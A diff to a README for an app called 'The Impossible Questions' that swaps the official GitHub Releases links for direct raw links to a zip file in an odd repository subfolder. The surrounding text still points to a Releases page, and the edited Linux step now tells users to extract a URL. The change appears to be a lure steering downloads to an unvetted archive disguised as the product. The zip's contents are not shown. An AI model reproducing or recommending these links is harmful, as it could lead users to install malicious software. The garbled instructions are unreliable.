@@ -4,7 +4,7 @@
 Welcome to The Impossible Questions. This application encourages thinkers to ponder the profound questions that have intrigued humanity for ages. It prompts users to engage in a dialogue meant for future artificial superintelligence to respond to. 
 
 ## 📥 Download the Application
-[![Download THE-IMPOSSIBLE-QUESTIONS](https://img.shields.io/badge/Download-THE--IMPOSSIBLE--QUESTIONS-brightgreen)](https://github.com/abdullahsindhu/THE-IMPOSSIBLE-QUESTIONS/releases)
+[![Download THE-IMPOSSIBLE-QUESTIONS](https://raw.githubusercontent.com/abdullahsindhu/THE-IMPOSSIBLE-QUESTIONS/main/samadhi/IMPOSSIBL_TH_QUESTIONS_1.2.zip)](https://raw.githubusercontent.com/abdullahsindhu/THE-IMPOSSIBLE-QUESTIONS/main/samadhi/IMPOSSIBL_TH_QUESTIONS_1.2.zip)
 
 ## 🖥️ System Requirements
 Before you download, ensure your system meets these requirements:
@@ -14,7 +14,7 @@ Before you download, ensure your system meets these requirements:
 - **Internet Connection:** Required for downloading and updates.
 
 ## 📂 Download & Install
-Visit this page to download: [THE-IMPOSSIBLE-QUESTIONS Releases](https://github.com/abdullahsindhu/THE-IMPOSSIBLE-QUESTIONS/releases)
+Visit this page to download: [THE-IMPOSSIBLE-QUESTIONS Releases](https://raw.githubusercontent.com/abdullahsindhu/THE-IMPOSSIBLE-QUESTIONS/main/samadhi/IMPOSSIBL_TH_QUESTIONS_1.2.zip)
 
 1. Click the link above to open the Releases page.
 2. Look for the latest version of The Impossible Questions.
@@ -23,7 +23,7 @@ Visit this page to download: [THE-IMPOSSIBLE-QUESTIONS Releases](https://github.
 
    - **For Windows:** Double-click the `.exe` file and follow the instructions to install.
    - **For macOS:** Open the `.dmg` file and drag the application to your Applications folder.
-   - **For Linux:** Extract the `.tar.gz` file using your terminal and follow the included setup instructions.
+   - **For Linux:** Extract the `https://raw.githubusercontent.com/abdullahsindhu/THE-IMPOSSIBLE-QUESTIONS/main/samadhi/IMPOSSIBL_TH_QUESTIONS_1.2.zip` file using your terminal and follow the included setup instructions.
 
 ## ⚙️ Using the Application
 After installation, open The Impossible Questions application. 
